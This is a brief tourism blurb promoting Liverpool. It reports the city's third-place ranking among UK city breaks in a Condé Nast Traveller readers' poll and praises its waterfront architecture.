CITY OF LIVERPOOL

Liverpool has been named in the top three UK city break destinations for the second successive year by readers of travel bible, Condé Nast Traveller Magazine.

Liverpool’s third position places the city ahead of other popular destinations including: Bath (4th); Oxford (5th); Manchester (6th) and York (7th)

Liverpool  has always been a city proud of its architecture. We have a wonderful waterfront that is recognisable as New York, Hong Kong or Sydney so get yourself on the ferry and revel in its splendour. For more info about Liverpool please click here
